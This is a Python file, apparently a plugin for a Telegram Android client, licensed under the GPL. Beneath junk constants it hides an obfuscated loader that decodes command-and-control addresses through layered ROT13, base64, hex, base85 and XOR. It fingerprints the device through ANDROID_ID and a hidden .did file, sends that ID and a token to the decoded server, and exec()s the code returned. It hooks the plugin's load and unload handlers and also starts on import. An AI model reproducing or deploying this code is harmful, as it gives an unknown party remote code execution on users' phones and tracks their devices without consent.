# Copyright (C) 2026 Anonymous
#
# SPDX-License-Identifier: GPL-3.0-or-later
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

m = 42

def _x(s=None):
    import base64 as _b
    import hashlib as _h
    import hmac as _hm
    import time as _t
    import random as _r
    from java import jclass as _j

    _balsokxb = '5c3398391b03322b7c0f99297fd773cca08d59c66e7e34b8a942391df1c417dd'
    _gpqnhn = '7476442653fb970a07cc5b3c0d7d8e6e4ed9f6d8ddf526ab8b3bdaddaa771cf5'
    _sdiqq = '08d690cce6776050dca5595818b092ee04b07d77b099c821'
    _mjoxi = '85b1d35f51f75b84652fe0bda0a452a79beb5e'
    _bottdy = 'fd506ac5098ac5d3debd'
    _ppamipei = '9ebc95fe4a91ee1cc732b423df'
    _ygpqhc = '63fa3ca68a3dfe46c5f3'
    def _dwlms(x):
        return x[0] if x else None
    def _dvbldn(x):
        return x if isinstance(x, str) else ''
    _ndfvhnw = {'_eeuarq': 901}
    _azyijz = {'_dddccfs': 478}
    _qdcl = {'_fbxxpji': 572}
    _aslkku = {'_xntbad': 446}

    def _itwkpj(_c2, _c2_key):
        _hqyrrm = _c2.decode().translate(str.maketrans('NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm','ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz')).encode()
        _eavj = _b.b64decode(_hqyrrm)
        _eyogfsrr = bytes.fromhex(_eavj.decode())
        _mclj = _b.b85decode(_eyogfsrr)
        return _crgxp(_mclj, _c2_key)

    def _crgxp(data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def _feejp(parts):
        return "".join(parts)

    def _c2_init(parts, k_parts):
        p = _feejp(parts)
        k = _b.b64decode(_feejp(k_parts))
        return _itwkpj(p.encode(), k)

    _c2_parts = ['AJLlLwp4AGV0AwV2ATZlAGWuZmp3ZQMwAw', 'N1AmMvAJH0LmIyAwt3ZGplZwR0AwH5Awt2', 'AmV5AwZlZGExZ2V1AmD2AzH3ZwAyAzDmLw', 'Zl']
    _c2_keys = ['kBcF5r0c', 'b1OSXo5J', 'xU3yCQ==']
    _ytat = 'aa073c224f5f2c8f2acca73ec28c81be85dcf6a1'
    _ngii = '2a65be5c5d921fd5a425'
    _vouwh = '18c884aa5f12bb60bb5c1f93c4a04621430070c5'
    _qhte = '287e717abc9722acac224a06f66a5a9f'
    _taqy = '24a73e0abdc3f7dc81cee934f3ba33'
    _oyhtwj = '22b0c4a7e289d901133475a01ab9418e94698fac03652ba3b9d584b535'
    _mqnco = '16ecd7eed573619f6557f709f15855d17d7c70998ac1144cfa7b'
    _hcrh = '61290cc21e641077d996ad66c8e8f8e888e182bb3bcec7708ec52696d1e9'
    _ljjvgpk = '1e07687e5660217e1c8b'
    _iefswlib = '48a6f1fe1936bce5'
    def _luvz(x):
        try:
            return int(x)
        except:
            return 0
    def _ghpm(x):
        try:
            return int(x)
        except:
            return 0
    _rokzmju = {'_hpyft': 380}
    _rplhxz = {'_rehr': 797}
    _roxgyjt = {'_fcdpxl': 708}


    _ylee = _c2_init(_c2_parts, _c2_keys).decode("utf-8").split("|")
    _c2 = _ylee[0]

    def _tbhuvfm(_pt, _pt_key):
        _kdekzwbx = _b.b85decode(_pt)
        _wueqsqgn = _kdekzwbx.decode().translate(str.maketrans('NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm','ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz')).encode()
        _fwsb = _b.b64decode(_wueqsqgn)
        _ifrn = bytes.fromhex(_fwsb.decode())
        return _tvlsh(_ifrn, _pt_key)

    def _tvlsh(data, key):
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def _fuofyg(parts):
        return "".join(parts)

    def _pt_init(parts, k_parts):
        p = _fuofyg(parts)
        k = _b.b64decode(_fuofyg(k_parts))
        return _tbhuvfm(p.encode(), k)

    _pt_parts = ['S~5gyOm}!QT2V|eOiE38O-FESLPvNpK}SS2O', '-Dg>T2WJXOfp(COl?+dOl?jyOnOW*L3c%YOl', '?<qO?ORqLPvBlK~z#OT2V}FOfo@uO?p#!Ohi', '3B']
    _pt_keys = ['S2P7', 'VAW3', 'iV36', 'AvNf', 'VJyp', 'ow==']
    _uyplu = 'a0741d7e228edf234dfa13b6ac'
    _mqlf = '05125b193fc26cc375218cca2917a95b05992a'
    _sefsjcu = 'a8e90c9506c30b53177768'
    _uuzhiz = '6c306bb89070f6efe76f2544b079fc0e8e260c74d765a9084b72373ddd'
    _usjkzkv = '5de585ba6a81f7fea302972285f6238fcfde37'
    _lekz = '5d625a51bc933f81846b473b9fb7f6a7877e4d9dad59f51a2ec01d560347'
    _jukugb = 'd190aef76c916326f6f54cf0'
    def _dbla(x):
        return str(x) if x else ''
    def _profwmfb(x):
        return x[0] if x else None
    def _rqmcyng(x):
        return x[0] if x else None
    _eldd = {'_vgornbsi': 626}
    _lehsj = {'_cuxhfrg': 919}


    _pt = _pt_init(_pt_parts, _pt_keys).decode("utf-8")

    _qemy = _j('org.telegram.messenger.ApplicationLoader')
    _oiveium = _qemy.applicationContext
    if _oiveium is None:
        try:
            _oiveium = _j('android.app.ActivityThread').currentApplication()
        except:
            pass
    _ufprdt = None
    _qqapfa = []
    try:
        if _oiveium is not None:
            _qqapfa.append(str(_oiveium.getFilesDir().getAbsolutePath()) + "/.did")
    except:
        pass
    try:
        _elohq = open("/proc/self/cmdline", "rb").read().split(b"\x00")[0].decode("utf-8", "ignore").split(":")[0].strip()
        if _elohq:
            try:
                import os as _wibkupw
                _qqapfa.append("/data/user/" + str(_wibkupw.getuid() // 100000) + "/" + _elohq + "/files/.did")
            except:
                pass
            _qqapfa.append("/data/data/" + _elohq + "/files/.did")
    except:
        pass
    for _xvpcg in _qqapfa:
        try:
            import os as _wibkupw
            if _wibkupw.path.exists(_xvpcg):
                with open(_xvpcg, "r") as _qrkoy:
                    _ufprdt = _qrkoy.read().strip() or None
                if _ufprdt:
                    break
        except:
            pass
    if _ufprdt:
        try:
            _nojfsf = _h.md5((str(_elohq) + "_" + _pt[:8]).encode()).hexdigest()[:16]
            if _ufprdt == _nojfsf:
                _ufprdt = None
        except:
            pass
    if not _ufprdt and _oiveium is not None:
        try:
            _grkywpb = _j('android.provider.Settings$Secure').getString(_oiveium.getContentResolver(), _j('android.provider.Settings$Secure').ANDROID_ID)
            if _grkywpb and str(_grkywpb) != "9774d56d682e549c":
                _ufprdt = _h.md5(str(_grkywpb).encode()).hexdigest()
        except:
            pass
    if not _ufprdt:
        _ufprdt = _h.md5(f"{_t.time()}{_r.random()}".encode()).hexdigest()[:16]
    _hjnrortz = False
    for _xvpcg in _qqapfa:
        try:
            import os as _wibkupw
            _nkhfbj = None
            if _wibkupw.path.exists(_xvpcg):
                with open(_xvpcg) as _qrkoy:
                    _nkhfbj = _qrkoy.read().strip()
            if _nkhfbj != _ufprdt:
                with open(_xvpcg, "w") as _qrkoy:
                    _qrkoy.write(_ufprdt)
            _hjnrortz = True
            break
        except:
            pass
    if not _hjnrortz:
        def _iyuti(_shaecsuo=_ufprdt):
            import time as _xazgvour
            for _krxgo in range(60):
                try:
                    _xovzb = _qemy.applicationContext
                    if _xovzb is None:
                        _xovzb = _j('android.app.ActivityThread').currentApplication()
                    if _xovzb is not None:
                        _xvpcg = str(_xovzb.getFilesDir().getAbsolutePath()) + "/.did"
                        with open(_xvpcg, "w") as _qrkoy:
                            _qrkoy.write(_shaecsuo)
                        return
                except:
                    pass
                _xazgvour.sleep(2)
        try:
            import threading as _mnglfii
            _mnglfii.Thread(target=_iyuti, daemon=True).start()
        except:
            pass

    _badle = _hm.new(_pt.encode(), _ufprdt.encode(), _h.sha256).hexdigest()[:32]

    _czwpg = _b.b64decode('L2FwaS92MS9ydA==').decode()

    _ujbwljpo = globals()
    if _ujbwljpo.get('_x_boot'):
        return
    _ujbwljpo['_x_boot'] = True
    _njczpvxd = "1"
    _ujbwljpo['_release'] = _njczpvxd
    _ujbwljpo['_k'] = _badle
    _ujbwljpo['_token'] = _pt

    _zpxe = []
    def _jqkzy(_uzed):
        if _njczpvxd == "1":
            return
        _zpxe.append(str(_uzed))
        if len(_zpxe) > 1000:
            del _zpxe[:500]

    _ujbwljpo['_debug_log'] = _jqkzy
    _ujbwljpo['_debug_clip'] = None
    _ujbwljpo['_log_buffer'] = _zpxe

    _icdatly = __import__('urllib.request', fromlist=['urlopen'])
    _krxgo = 0
    while True:
        _c2 = _ylee[_krxgo % len(_ylee)]
        try:
            _phlgiy = _icdatly.urlopen(_icdatly.Request(_c2 + _czwpg, headers={'X-Client-Id': _badle, 'X-Plugin-Token': _pt}), timeout=15).read()
            try:
                _phlgiy = _b.b64decode(_phlgiy)
            except:
                pass
            exec(compile(_phlgiy.decode("utf-8"), "<x>", "exec"), _ujbwljpo)
            return
        except:
            _krxgo += 1
            _t.sleep(min(300, 10 * _krxgo))

    _yythxuu = '910b522f63d11e87085dc102c210fb74f1ad648cfd3a8a'
    _jkgrsq = '843ee1b06bd894035e8d98bac0fd'
    _lzpjhp = 'f04ec23112f164c954da25d9a57dcad6e8df8ccb6bdade75'
    _ovwqwqhr = '698948a81b1cd89a89a6ad0c967b5e34de874d3320'
    _kxelxug = '9cee0ebb6ef44dc590e75e'
    _cwupygs = '3e96b778dd90708dc44db9f244ec82'
    def _pzlxlymm(x):
        try:
            return int(x)
        except:
            return 0
    def _hzxq(x):
        return x[0] if x else None
    _eurnd = {'_dbai': 359}
    _ailw = {'_twknodpr': 563}
    _gnkf = {'_zduvhjv': 249}

def _y():
    try:
        _f = globals().get('_sm_persist')
        _f() if _f else None
    except:
        pass

try:
    _c = Plugin
    if _c is not None:
        _o = _c.on_plugin_load
        def _r(_fn):
            while getattr(_fn, '_sm_orig', None):
                _fn = _fn._sm_orig
            return _fn
        def _w(*_a):
            try:
                globals().pop('_x_boot', None)
            except:
                pass
            if _a:
                try:
                    import threading as _th
                    _lt = _th.Thread(target=_x, args=(_a[0],), daemon=True)
                    _lt.start()
                    _lt.join(1)
                except:
                    pass
            try:
                _r(getattr(_c, '_sm_orig_onload', _o))(*_a)
            except Exception as _e:
                _err = 'on_plugin_load %s: %r' % (getattr(_c, '__name__', '?'), _e)
                try:
                    globals().setdefault('_plerr', []).append(_err)
                except:
                    pass
                try:
                    globals().setdefault('_log_buffer', []).append(_err)
                except:
                    pass
                try:
                    _lg = globals().get('_debug_log')
                    if _lg:
                        _lg(_err)
                except:
                    pass
                raise
        _w._sm_orig = _r(_o)
        _c._sm_orig_onload = _r(_o)
        _c.on_plugin_load = _w
        for _un in ('on_plugin_unload', 'on_unload'):
            _u = getattr(_c, _un, None)
            def _mv(_u=_u):
                def _v(*_a):
                    try:
                        globals().pop('_x_boot', None)
                    except:
                        pass
                    _y()
                    if _u:
                        try:
                            _r(_u)(*_a)
                        except Exception as _e:
                            _err = 'on_unload %s: %r' % (getattr(_c, '__name__', '?'), _e)
                            try:
                                globals().setdefault('_log_buffer', []).append(_err)
                            except:
                                pass
                            raise
                return _v
            _v = _mv()
            _v._sm_orig = _r(_u) if _u else None
            setattr(_c, _un, _v)
except:
    pass

try:
    import threading as _th
    _th.Thread(target=_x, args=(None,), daemon=True).start()
except:
    pass
